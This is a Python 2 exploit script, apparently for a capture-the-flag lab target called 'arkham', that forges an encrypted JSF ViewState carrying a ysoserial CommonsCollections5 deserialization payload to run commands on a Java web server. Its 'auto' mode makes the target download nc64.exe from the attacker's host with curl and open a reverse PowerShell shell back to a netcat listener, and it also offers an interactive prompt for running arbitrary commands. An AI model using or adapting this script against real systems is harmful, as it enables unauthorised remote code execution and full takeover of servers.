#!/usr/bin/env python2

import hmac
import base64
import socket
import hashlib
import requests

from os import system
from Crypto.Cipher import DES

IP = "10.10.14.110"
PORT = "4444"

def padding_append(data):
    if len(data) % 8:
        for n in xrange(len(data)):
            if ((len(data) + n) % 8) == 0:
                data += chr(n) * n
                break

    return data

def encrypt_viewstate(viewstate, secret):
    secret = base64.b64decode(secret)
    des = DES.new(secret, DES.MODE_ECB)

    viewstate = padding_append(viewstate)
    viewstate = [viewstate[n:n+8] for n in xrange(0, len(viewstate), 8)]
    viewstate = "".join(map(des.encrypt, viewstate))
    viewstate += hmac.new(secret, viewstate, hashlib.sha1).digest()
    viewstate = base64.b64encode(viewstate)

    return viewstate

cmd1 = "curl -O http://" + IP + "/nc64.exe"
cmd2 = "cmd.exe /c nc64.exe " + IP + " " + PORT + " -e powershell.exe"

def send(cmd):
    system("java -jar ysoserial.jar CommonsCollections5 \"" + cmd + "\" > exploit.txt ")

    with open("exploit.txt", "r") as placeholder: exploit = placeholder.read()

    payload = encrypt_viewstate(exploit, "SnNGOTg3Ni0=")

    requests.post("http://10.10.10.130:8080/userSubscribe.faces", data = { "j_id_jsp_1623871077_1%3Aemail": "jeff@minehoma.com", 
        "j_id_jsp_1623871077_1%3Asubmit": "SIGN+UP", "j_id_jsp_1623871077_1_SUBMIT": "1", "javax.faces.ViewState": payload })

    system("rm exploit.txt")

while True:
    cmd = raw_input("arkham> ")
    if (cmd == "exit"):
        break
    elif (cmd == "auto"):
        system("python -m SimpleHTTPServer 80 &")
        send(cmd1)
        system("sleep 1")
        send(cmd2)
        system("fuser -k 80/tcp")
        system("nc -lvp " + PORT)
        break
    else:
        send(cmd)
